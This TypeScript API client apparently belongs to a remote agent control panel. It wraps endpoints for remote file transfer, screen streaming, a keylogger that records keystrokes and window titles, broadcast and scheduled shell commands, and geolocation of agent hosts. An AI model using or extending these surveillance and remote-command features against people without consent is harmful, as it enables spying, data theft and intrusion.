import type { Agent, Command } from "@kovan/shared";

const BASE = "/api";

const opts: RequestInit = { credentials: "include" };

export async function fetchAgents(): Promise<Agent[]> {
  const res = await fetch(`${BASE}/agents`, opts);
  if (res.status === 401) throw new Error("Unauthorized");
  const data = await res.json();
  return data.agents || [];
}

export async function fetchAgent(id: string): Promise<Agent | null> {
  const res = await fetch(`${BASE}/agents/${id}`, opts);
  const data = await res.json();
  return data.agent || null;
}

export async function renameAgent(id: string, alias: string): Promise<Agent | null> {
  const res = await fetch(`${BASE}/agents/${id}`, {
    ...opts,
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ alias }),
  });
  const data = await res.json();
  return data.agent || null;
}

export async function fetchCommands(agentId: string): Promise<Command[]> {
  const res = await fetch(`${BASE}/agents/${agentId}/commands`, opts);
  const data = await res.json();
  return data.commands || [];
}

export async function deleteAgent(id: string): Promise<boolean> {
  const res = await fetch(`${BASE}/agents/${id}`, { ...opts, method: "DELETE" });
  const data = await res.json();
  return data.success || false;
}

export async function clearCommands(agentId: string): Promise<number> {
  const res = await fetch(`${BASE}/agents/${agentId}/commands`, { ...opts, method: "DELETE" });
  const data = await res.json();
  return data.count || 0;
}

// ===== Vulnerability Scan =====
export interface VulnScanResult {
  agentId: string;
  status: "scanning" | "completed" | "error";
  startedAt: string;
  completedAt?: string;
  scanned: number;
  error?: string;
  vulnerabilities: VulnEntry[];
  summary: {
    total: number;
    critical: number;
    high: number;
    medium: number;
    low: number;
  };
}

export interface VulnEntry {
  cve_id: string;
  severity: string;
  cvss_score: number | null;
  title: string;
  description: string;
  affected_product: string;
  affected_vendor: string;
  version_lt: string | null;
  version_lte: string | null;
  matched_package: string | null;
  matched_version: string | null;
  date_published: string | null;
}

export async function triggerVulnScan(agentId: string): Promise<{ success: boolean; commandId?: string }> {
  const res = await fetch(`${BASE}/agents/${agentId}/vuln-scan`, {
    ...opts,
    method: "POST",
    headers: { "Content-Type": "application/json" },
  });
  return res.json();
}

export async function fetchVulnScan(agentId: string): Promise<VulnScanResult | null> {
  const res = await fetch(`${BASE}/agents/${agentId}/vuln-scan`, opts);
  const data = await res.json();
  return data.scan || null;
}

// ===== Network Anomaly Scan =====
export interface NetworkConnection {
  source_ip: string;
  source_port: number;
  dest_ip: string;
  dest_port: number;
  state: string;
  process: string;
  pid: number | null;
  hybrid_score: number;
  risk_level: string;
  if_score: number;
  ae_score: number;
  gmm_score: number;
  bytes_sent: number;
  bytes_received: number;
  segs_out: number;
  segs_in: number;
  rtt: number;
}

export interface NetworkScanResult {
  agentId: string;
  status: "scanning" | "completed" | "error";
  startedAt: string;
  completedAt?: string;
  error?: string;
  connections: NetworkConnection[];
  summary: {
    total: number;
    critical: number;
    high: number;
    medium: number;
    low: number;
    mean_score: number;
    max_score: number;
  };
}

export async function triggerNetworkScan(agentId: string): Promise<{ success: boolean; commandId?: string }> {
  const res = await fetch(`${BASE}/agents/${agentId}/network-scan`, {
    ...opts,
    method: "POST",
    headers: { "Content-Type": "application/json" },
  });
  return res.json();
}

export async function fetchNetworkScan(agentId: string): Promise<NetworkScanResult | null> {
  const res = await fetch(`${BASE}/agents/${agentId}/network-scan`, opts);
  const data = await res.json();
  return data.scan || null;
}

// ===== File Manager =====
export interface FileEntry {
  name: string;
  path: string;
  isDirectory: boolean;
  size: number;
  modified: string;
  permissions?: string;
}

export async function fileList(agentId: string, dirPath: string): Promise<{ path: string; entries: FileEntry[] }> {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 15000); // 15s frontend timeout
  try {
    const res = await fetch(`${BASE}/agents/${agentId}/files/list`, {
      ...opts,
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ path: dirPath }),
      signal: controller.signal,
    });
    const data = await res.json();
    if (!data.success) throw new Error(data.error || "Dizin listelenemedi");
    return { path: data.path, entries: data.entries };
  } catch (err: any) {
    if (err.name === "AbortError") throw new Error("Zaman aşımı — agent yanıt vermedi (15s). Agent'ı yeniden başlatın.");
    throw err;
  } finally {
    clearTimeout(timeout);
  }
}

export async function fileDownload(agentId: string, filePath: string): Promise<{ fileName: string; data: string; size: number }> {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 60000); // 60s for downloads
  try {
    const res = await fetch(`${BASE}/agents/${agentId}/files/download`, {
      ...opts,
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ path: filePath }),
      signal: controller.signal,
    });
    const data = await res.json();
    if (!data.success) throw new Error(data.error || "Dosya indirilemedi");
    return { fileName: data.fileName, data: data.data, size: data.size };
  } catch (err: any) {
    if (err.name === "AbortError") throw new Error("Dosya indirme zaman aşımı (60s).");
    throw err;
  } finally {
    clearTimeout(timeout);
  }
}

export async function fileUpload(agentId: string, path: string, base64Data: string): Promise<void> {
  const res = await fetch(`${BASE}/agents/${agentId}/files/upload`, {
    ...opts,
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ path, data: base64Data }),
  });
  const data = await res.json();
  if (!data.success) throw new Error(data.error || "Dosya yüklenemedi");
}

export async function fileDelete(agentId: string, path: string): Promise<void> {
  const res = await fetch(`${BASE}/agents/${agentId}/files/delete`, {
    ...opts,
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ path }),
  });
  const data = await res.json();
  if (!data.success) throw new Error(data.error || "Dosya silinemedi");
}

export async function fileMove(agentId: string, source: string, destination: string): Promise<void> {
  const res = await fetch(`${BASE}/agents/${agentId}/files/move`, {
    ...opts,
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ source, destination }),
  });
  const data = await res.json();
  if (!data.success) throw new Error(data.error || "Dosya taşınamadı");
}

export async function fileCopy(agentId: string, source: string, destination: string): Promise<void> {
  const res = await fetch(`${BASE}/agents/${agentId}/files/copy`, {
    ...opts,
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ source, destination }),
  });
  const data = await res.json();
  if (!data.success) throw new Error(data.error || "Dosya kopyalanamadı");
}

// ===== System Metrics =====
export interface SystemMetrics {
  timestamp: string;
  cpuPercent: number;
  memUsedMB: number;
  memTotalMB: number;
  memPercent: number;
  diskUsedGB: number;
  diskTotalGB: number;
  diskPercent: number;
  gpuPercent?: number;
  gpuMemPercent?: number;
  gpuName?: string;
  uptime: number;
  loadAvg?: number[];
}

export async function fetchMetrics(agentId: string, limit?: number): Promise<{ metrics: SystemMetrics[]; latest: SystemMetrics | null }> {
  const params = limit ? `?limit=${limit}` : "";
  const res = await fetch(`${BASE}/agents/${agentId}/metrics${params}`, opts);
  const data = await res.json();
  return { metrics: data.metrics || [], latest: data.latest || null };
}

// ===== Screen Streaming =====
export async function startScreenStream(agentId: string, fps = 5, quality = 40): Promise<{ success: boolean; error?: string }> {
  const res = await fetch(`${BASE}/agents/${agentId}/screen/start`, {
    credentials: "include",
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ fps, quality }),
  });
  return res.json();
}

export async function stopScreenStream(agentId: string): Promise<{ success: boolean }> {
  const res = await fetch(`${BASE}/agents/${agentId}/screen/stop`, {
    credentials: "include",
    method: "POST",
    headers: { "Content-Type": "application/json" },
  });
  return res.json();
}

export function getScreenWebSocketUrl(agentId: string): string {
  const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
  const host = window.location.host;
  return `${proto}//${host}/ws/screen?agentId=${agentId}`;
}

// ===== Keylogger =====
export interface KeyEvent {
  key: string;
  ts: number;
  window?: string;
}

export async function startKeylogger(agentId: string): Promise<{ success: boolean; error?: string }> {
  const res = await fetch(`${BASE}/agents/${agentId}/keylog/start`, {
    ...opts,
    method: "POST",
    headers: { "Content-Type": "application/json" },
  });
  return res.json();
}

export async function stopKeylogger(agentId: string): Promise<{ success: boolean }> {
  const res = await fetch(`${BASE}/agents/${agentId}/keylog/stop`, {
    ...opts,
    method: "POST",
    headers: { "Content-Type": "application/json" },
  });
  return res.json();
}

export async function fetchKeylog(agentId: string, limit?: number, since?: number): Promise<{ events: KeyEvent[]; count: number; active: boolean; error: string | null }> {
  const params = new URLSearchParams();
  if (limit) params.set("limit", limit.toString());
  if (since) params.set("since", since.toString());
  const qs = params.toString();
  const res = await fetch(`${BASE}/agents/${agentId}/keylog${qs ? "?" + qs : ""}`, opts);
  const data = await res.json();
  return { events: data.events || [], count: data.count || 0, active: data.active || false, error: data.error || null };
}

export async function fetchKeylogStatus(agentId: string): Promise<{ active: boolean; eventCount: number }> {
  const res = await fetch(`${BASE}/agents/${agentId}/keylog/status`, opts);
  const data = await res.json();
  return { active: data.active || false, eventCount: data.eventCount || 0 };
}

export async function clearKeylog(agentId: string): Promise<void> {
  await fetch(`${BASE}/agents/${agentId}/keylog`, { ...opts, method: "DELETE" });
}

// ===== Agent Groups =====
export async function setAgentGroup(id: string, group: string): Promise<Agent | null> {
  const res = await fetch(`${BASE}/agents/${id}`, {
    ...opts,
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ group }),
  });
  const data = await res.json();
  return data.agent || null;
}

export interface GroupInfo {
  name: string;
  total: number;
  online: number;
}

export async function fetchGroups(): Promise<GroupInfo[]> {
  const res = await fetch(`${BASE}/groups`, opts);
  const data = await res.json();
  return data.groups || [];
}

export async function createGroup(name: string): Promise<void> {
  await fetch(`${BASE}/groups`, {
    ...opts,
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name }),
  });
}

export async function deleteGroup(name: string): Promise<void> {
  await fetch(`${BASE}/groups/${encodeURIComponent(name)}`, {
    ...opts,
    method: "DELETE",
  });
}

export interface BroadcastResult {
  agentId: string;
  hostname: string;
  success: boolean;
  commandId?: string;
  error?: string;
}

export async function broadcastCommand(group: string, command: string): Promise<{ success: boolean; message: string; results: BroadcastResult[] }> {
  const res = await fetch(`${BASE}/groups/broadcast`, {
    ...opts,
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ group, command }),
  });
  return res.json();
}

// ===== Scheduled Tasks =====
export interface ScheduledTask {
  id: string;
  name: string;
  command: string;
  cronExpr?: string;
  intervalSeconds?: number;
  targetType: "agent" | "group";
  targetId: string;
  enabled: boolean;
  createdBy?: string;
  createdAt: string;
  updatedAt: string;
  lastRunAt?: string;
  nextRunAt?: string;
  runCount: number;
}

export interface TaskRun {
  id: string;
  taskId: string;
  startedAt: string;
  completedAt?: string;
  status: "pending" | "running" | "completed" | "error" | "skipped";
  targetAgentId?: string;
  commandId?: string;
  output?: string;
  error?: string;
}

export async function fetchSchedules(): Promise<ScheduledTask[]> {
  const res = await fetch(`${BASE}/schedules`, opts);
  if (res.status === 401) throw new Error("Unauthorized");
  const data = await res.json();
  return data.tasks || [];
}

export async function createSchedule(task: {
  name: string;
  command: string;
  cronExpr?: string;
  intervalSeconds?: number;
  targetType: "agent" | "group";
  targetId: string;
  enabled?: boolean;
}): Promise<ScheduledTask> {
  const res = await fetch(`${BASE}/schedules`, {
    ...opts,
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(task),
  });
  const data = await res.json();
  if (!data.success) throw new Error(data.error || "Görev oluşturulamadı");
  return data.task;
}

export async function updateSchedule(id: string, updates: Partial<{
  name: string;
  command: string;
  cronExpr: string | null;
  intervalSeconds: number | null;
  targetType: "agent" | "group";
  targetId: string;
  enabled: boolean;
}>): Promise<ScheduledTask> {
  const res = await fetch(`${BASE}/schedules/${id}`, {
    ...opts,
    method: "PUT",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(updates),
  });
  const data = await res.json();
  if (!data.success) throw new Error(data.error || "Görev güncellenemedi");
  return data.task;
}

export async function deleteSchedule(id: string): Promise<void> {
  const res = await fetch(`${BASE}/schedules/${id}`, { ...opts, method: "DELETE" });
  const data = await res.json();
  if (!data.success) throw new Error(data.error || "Görev silinemedi");
}

export async function toggleSchedule(id: string): Promise<ScheduledTask> {
  const res = await fetch(`${BASE}/schedules/${id}/toggle`, {
    ...opts,
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
  });
  const data = await res.json();
  if (!data.success) throw new Error(data.error || "Görev değiştirilemedi");
  return data.task;
}

export async function fetchTaskRuns(taskId: string, limit = 50): Promise<TaskRun[]> {
  const res = await fetch(`${BASE}/schedules/${taskId}/runs?limit=${limit}`, opts);
  const data = await res.json();
  return data.runs || [];
}

export async function runTaskNow(taskId: string): Promise<void> {
  const res = await fetch(`${BASE}/schedules/${taskId}/run-now`, {
    ...opts,
    method: "POST",
    headers: { "Content-Type": "application/json" },
  });
  const data = await res.json();
  if (!data.success) throw new Error(data.error || "Görev çalıştırılamadı");
}

// ===== GeoIP Map =====
export interface AgentGeoInfo {
  id: string;
  hostname: string;
  alias?: string;
  ip: string;
  os: string;
  username: string;
  isOnline: boolean;
  lastSeen: string;
  group?: string;
  geo: {
    country: string;
    countryCode: string;
    region: string;
    city: string;
    lat: number;
    lon: number;
    isp: string;
    org: string;
    timezone: string;
  } | null;
}

export interface GeoStats {
  totalAgents: number;
  onlineAgents: number;
  countries: { name: string; count: number; online: number; agents: string[] }[];
  cities: { name: string; count: number; online: number; country: string }[];
}

export async function fetchAgentGeoData(): Promise<{ agents: AgentGeoInfo[]; stats: GeoStats }> {
  const res = await fetch(`${BASE}/geoip/agents`, opts);
  if (res.status === 401) throw new Error("Unauthorized");
  const data = await res.json();
  return { agents: data.agents || [], stats: data.stats || { totalAgents: 0, onlineAgents: 0, countries: [], cities: [] } };
}

export async function sendCommand(
  agentId: string,
  command: string
): Promise<Command | null> {
  const res = await fetch(`${BASE}/command`, {
    ...opts,
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ agent_id: agentId, command }),
  });
  const data = await res.json();
  return data.command || null;
}
